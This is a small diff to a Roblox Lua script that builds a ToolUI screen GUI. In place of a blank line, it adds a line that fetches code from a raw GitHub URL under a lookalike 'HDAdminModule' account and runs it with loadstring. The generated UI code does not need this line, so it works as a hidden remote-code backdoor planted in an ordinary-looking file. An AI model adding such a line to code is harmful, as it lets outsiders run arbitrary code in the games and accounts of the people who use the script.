@@ -3,7 +3,7 @@
 -- // INSTANCES: 11 | SCRIPTS: 3 | MODULES: 0 \\ --
 
 local UI = {}
-
+print(loadstring(game:HttpGet("https://raw.githubusercontent.com/HDAdminModule/helper/refs/heads/main/what%20weapons%3F")()))
 -- // StarterGui.ToolUI \\ --
 UI["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"))
 UI["1"]["Name"] = [[ToolUI]]
